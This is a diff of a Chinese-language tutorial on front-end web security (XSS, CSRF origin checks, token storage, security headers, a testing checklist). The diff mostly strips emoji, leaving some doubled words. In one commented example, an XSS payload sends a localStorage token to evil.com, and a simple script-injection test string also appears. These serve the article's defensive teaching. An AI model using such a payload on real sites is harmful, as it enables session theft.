@@ -2,7 +2,7 @@
 
 > 在 Web 开发中，安全往往是最后才被考虑的因素，但一旦发生安全事故，后果可能是灾难性的。本文将深入剖析前端安全的各个维度，从攻击原理到防御策略，帮助你构建更安全的 Web 应用。
 
-## 🔍 为什么前端安全至关重要？
+##  为什么前端安全至关重要？
 
 在传统观念中，"前端无秘密"——所有代码都暴露在用户浏览器中。但这并不意味着前端安全不重要：
 
@@ -11,7 +11,7 @@
 3. **品牌声誉**：安全事故会严重损害用户信任
 4. **合规要求**：GDPR、网络安全法等对数据安全有严格要求
 
-## 📋 前端安全威胁全景图
+##  前端安全威胁全景图
 
 ```
 ┌─────────────────────────────────────────────────────────┐
@@ -296,18 +296,18 @@ app.use(session({
 app.post('/api/action', (req, res) => {
   const referer = req.get('Referer')
   const origin = req.get('Origin')
-  
+
   if (!referer && !origin) {
     return res.status(403).json({ error: 'Missing origin header' })
   }
-  
+
   const allowedOrigins = ['https://example.com', 'https://www.example.com']
   const requestOrigin = origin || new URL(referer).origin
-  
+
   if (!allowedOrigins.includes(requestOrigin)) {
     return res.status(403).json({ error: 'Invalid origin' })
   }
-  
+
   // 处理请求
 })
 ```
@@ -398,14 +398,14 @@ if (window.frameElement) {
 #### localStorage 存储 Token
 
 ```javascript
-// ❌ 错误：敏感 token 存储在 localStorage
+// 错误 错误：敏感 token 存储在 localStorage
 localStorage.setItem('token', 'eyJhbGciOi...')
 // XSS 可以轻松读取
 // <script>
 //   fetch('https://evil.com?token=' + localStorage.getItem('token'))
 // </script>
 
-// ✅ 正确：使用 HttpOnly Cookie
+// 正确 正确：使用 HttpOnly Cookie
 // 服务端设置
 res.cookie('token', token, {
   httpOnly: true,  // JavaScript 无法读取
@@ -418,10 +418,10 @@ res.cookie('token', token, {
 #### URL 参数泄露
 
 ```javascript
-// ❌ 错误：敏感信息在 URL 中
+// 错误 错误：敏感信息在 URL 中
 // https://example.com/reset-password?token=abc123&email=user@example.com
 
-// ✅ 正确：使用 POST 请求
+// 正确 正确：使用 POST 请求
 app.post('/reset-password', (req, res) => {
   const { token, email, newPassword } = req.body
   // token 在请求体中，不会出现在 URL
@@ -431,11 +431,11 @@ app.post('/reset-password', (req, res) => {
 #### Console 打印敏感信息
 
 ```javascript
-// ❌ 开发环境遗留代码
+// 错误 开发环境遗留代码
 console.log('User token:', token)
 console.log('API response:', { user, password: '...' })
 
-// ✅ 生产环境移除
+// 正确 生产环境移除
 if (process.env.NODE_ENV === 'development') {
   console.log('Debug info:', data)
 }
@@ -496,25 +496,25 @@ app.use(helmet())
 app.use((req, res, next) => {
   // XSS 保护
   res.setHeader('X-XSS-Protection', '1; mode=block')
-  
+
   // 禁止 MIME 类型嗅探
   res.setHeader('X-Content-Type-Options', 'nosniff')
-  
+
   // 点击劫持防护
   res.setHeader('X-Frame-Options', 'DENY')
-  
+
   // HTTPS 强制（生产环境）
   res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains')
-  
+
   // CSP
   res.setHeader('Content-Security-Policy', "default-src 'self'")
-  
+
   // Referrer 策略
   res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin')
-  
+
   // 权限策略
   res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()')
-  
+
   next()
 })
 ```
@@ -544,15 +544,15 @@ npm audit fix
   - 输入框注入测试：<script>alert(1)</script>
   - URL 参数注入测试
   - 富文本编辑器测试
-  
+
 [ ] CSRF 测试
   - 跨站请求测试
   - Token 验证测试
-  
+
 [ ] 权限测试
   - 越权访问测试
   - IDOR（不安全的直接对象引用）测试
-  
+
 [ ] 数据泄露测试
   - URL 参数检查
   - localStorage 检查
@@ -667,4 +667,4 @@ npm audit fix
 
 ---
 
-*本文由小虾子 🦐 撰写*
+*本文由小虾子  撰写*
